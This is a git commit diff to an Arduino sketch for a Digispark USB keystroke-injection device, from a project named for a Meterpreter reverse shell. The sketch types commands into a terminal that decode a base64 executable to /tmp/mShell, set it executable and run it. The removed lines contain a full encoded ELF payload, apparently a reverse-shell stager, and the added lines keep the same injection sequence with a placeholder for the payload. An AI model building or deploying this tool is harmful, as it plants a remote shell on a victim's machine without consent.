5b6f557626a13886bcfc1f3a3d0331a9aa03350b
cybersomething <46792838+cybersomething@users.noreply.github.com>
2019-05-02 18:19:54 +0100

    Update reverseShell.ino

--- MeterpreterReverseShell/reverseShell.ino
+++ MeterpreterReverseShell/reverseShell.ino
@@ -1,54 +1,25 @@
 #include "DigiKeyboard.h"
 
 void setup() {
+DigiKeyboard.sendKeyStroke(0); 
+DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT + MOD_ALT_LEFT);
+DigiKeyboard.delay(1000);
 
-// LED on.
-pinMode(1, OUTPUT);
-delay(200);
-// Super, delete content
-// Start to inject payload, turn the LED on
-digitalWrite(1, HIGH);
-DigiKeyboard.sendKeyStroke(KEY_DELETE); // Clean
-delay(200);
-
-DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); // Super key, open 'search'
-delay(300);
-
-DigiKeyboard.print("terminal"); // Program to run
-delay(500);
-
-DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
-// Delay for 1 second, if terminal is not opened, part of the string below is wasted to /dev/null
-delay(1000);
-
-// Send our payload
-DigiKeyboard.print("echo");
-DigiKeyboard.sendKeyStroke(KEY_SPACE);
-DigiKeyboard.print("f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1toCgAACGgCAANwieFqZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E= | base64 --decode &gt; /tmp/mShell");
+DigiKeyboard.print("echo 'GENERATED BASE 64 CODE GOES IN HERE'/+E= | base64 --decode &gt; /tmp/mShell");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
-delay(500);
+DigiKeyboard.delay(500);
 
-// Change the permissions for the file...
 DigiKeyboard.println("chmod 755 /tmp/mShell");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
-delay(200);
-// ...and execute it
+DigiKeyboard.delay(200);
 DigiKeyboard.println("/tmp/mShell");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-delay(100);
-// Payload executed!
-digitalWrite(1, LOW);
+DigiKeyboard.delay(100);
 
 }
 
 void loop() {
-// When scripts are done, blink some LED like it's 19
-
-digitalWrite(1, HIGH);
-delay(200);
-
-digitalWrite(1, LOW);
-delay(300);
-
+//left deliberately empty
 }
